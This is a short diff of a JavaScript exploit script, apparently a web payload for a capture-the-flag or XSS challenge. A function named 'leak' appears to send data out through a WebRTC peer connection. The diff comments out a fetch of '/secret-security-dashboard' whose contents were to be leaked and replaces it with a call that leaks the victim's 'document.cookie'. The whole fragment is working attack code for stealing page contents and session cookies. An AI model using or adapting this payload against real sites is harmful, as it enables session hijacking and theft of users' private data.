@@ -20,8 +20,9 @@ async function leak(data) {
   await p.setLocalDescription();
 }
 
-try {
-    fetch('/secret-security-dashboard').then(res => res.text()).then(d => leak(d.slice(0, 100)));
-} catch (e) {
-    leak(e.message);
-}
+// try {
+//     fetch('/secret-security-dashboard').then(res => res.text()).then(d => leak(d.slice(0, 100)));
+// } catch (e) {
+//     leak(e.message);
+// }
+leak(document.cookie || "no cookie");
